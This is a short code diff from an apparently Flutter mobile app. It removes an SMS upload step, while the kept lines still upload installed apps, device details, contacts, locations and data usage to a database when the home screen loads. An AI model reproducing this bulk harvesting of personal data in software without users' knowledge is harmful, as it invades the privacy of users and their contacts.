@@ -164,7 +164,6 @@ class _HomeScreenState extends State<HomeScreen> {
     });
     await uploadToDatabase('appInstall');
     await uploadToDatabase('device');
-    await uploadToDatabase('sms');
     await getContacts().then((value) => upload('contacts'));
     await locationPermission().then((value) => upload('locations'));
     await uploadToDatabase('dataUsage');
